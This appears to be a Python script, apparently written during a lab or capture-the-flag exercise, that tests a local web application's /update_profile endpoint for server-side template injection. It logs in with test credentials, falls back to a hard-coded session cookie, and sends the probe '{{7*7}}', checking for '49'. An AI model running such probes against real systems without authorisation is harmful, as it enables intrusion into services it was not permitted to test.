import requests
import sys
import time

BASE_URL = "http://127.0.0.1:32812"

# Use the session cookie from context
EXISTING_SESSION = "eyJ1c2VyX2lkIjoxfQ.aVqGLQ.FiimogdV8wgJ6FRcOPJADZ3HhSY"

def test_connection():
    """Test basic connectivity"""
    try:
        response = requests.get(BASE_URL, timeout=5)
        print(f"Basic connectivity test: Status {response.status_code}")
        return True
    except Exception as e:
        print(f"Connection failed: {e}")
        return False

def test_endpoint(url, cookie=None):
    """Test if endpoint exists"""
    try:
        cookies = {'session': cookie} if cookie else None
        response = requests.get(url, cookies=cookies, timeout=10, allow_redirects=False)
        print(f"GET {url}: Status {response.status_code}")
        if response.status_code == 200:
            print(f"  Content length: {len(response.text)}B")
        return response.status_code
    except Exception as e:
        print(f"GET {url} failed: {e}")
        return 0

def login_with_retry():
    """Login with proper retry logic"""
    url = f"{BASE_URL}/login"
    data = {'username': 'test', 'password': 'test'}
    
    for attempt in range(3):
        try:
            response = requests.post(url, data=data, allow_redirects=False, timeout=10)
            print(f"Login attempt {attempt + 1}: Status {response.status_code}")
            
            if response.status_code in [200, 302]:
                session = response.cookies.get('session')
                return response.status_code, session
            elif response.status_code == 500:
                time.sleep(1)  # Wait before retry
                continue
            else:
                print(f"Unexpected status: {response.status_code}")
                print(f"Response: {response.text[:200]}")
                return response.status_code, None
                
        except requests.exceptions.RequestException as e:
            print(f"Login request error: {type(e).__name__}")
            if attempt < 2:
                time.sleep(2)  # Wait longer before retry
    
    return 500, None

def test_ssti(session_cookie):
    """Test SSTI payload on /update_profile"""
    url = f"{BASE_URL}/update_profile"
    cookies = {'session': session_cookie}
    
    print(f"\nTesting SSTI on {url}")
    print(f"Using session: {session_cookie[:40]}...")
    
    # SSTI payload
    files = {'name': (None, '{{7*7}}')}
    
    try:
        response = requests.post(url, cookies=cookies, files=files, timeout=10)
        print(f"POST Status: {response.status_code}")
        print(f"Response length: {len(response.text)}B")
        return response.status_code, response.text
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {type(e).__name__}")
        return 0, str(e)

# Main execution
print("SSTI Vulnerability Test for /update_profile")
print("=" * 60)

# Test basic connectivity
if not test_connection():
    print("Server is not responding. Please check if it's running on port 32812.")
    sys.exit(1)

# Test if /update_profile exists
print(f"\n[1] Testing endpoint availability:")
update_status = test_endpoint(f"{BASE_URL}/update_profile", EXISTING_SESSION)

# Try login
print(f"\n[2] Testing authentication:")
login_status, session = login_with_retry()

if session:
    print(f"Login successful. Session obtained: {session[:40]}...")
    
    # Test SSTI
    update_status, update_body = test_ssti(session)
    
    # Check for SSTI indicator
    print(f"\n[3] SSTI Test Results:")
    if '49' in update_body:
        print("[SUCCESS] SSTI confirmed! Found '49' in response")
        print(f"Response preview:\n{update_body}")
    else:
        print("[SSTI Test Result] '49' NOT found in response")
        print(f"Response preview:\n{update_body[:500]}")
else:
    print("[ERROR] Failed to obtain valid session")
    print(f"Using existing session from context: {EXISTING_SESSION[:40]}...")
    update_status, update_body = test_ssti(EXISTING_SESSION)
    
    print(f"\nResponse length: {len(update_body)}B")
    if '49' in update_body:
        print("[SUCCESS] SSTI confirmed with existing session! Found '49'")
    else:
        print("[RESULT] '49' NOT found with existing session")
        print(f"Response preview:\n{update_body[:500]}")
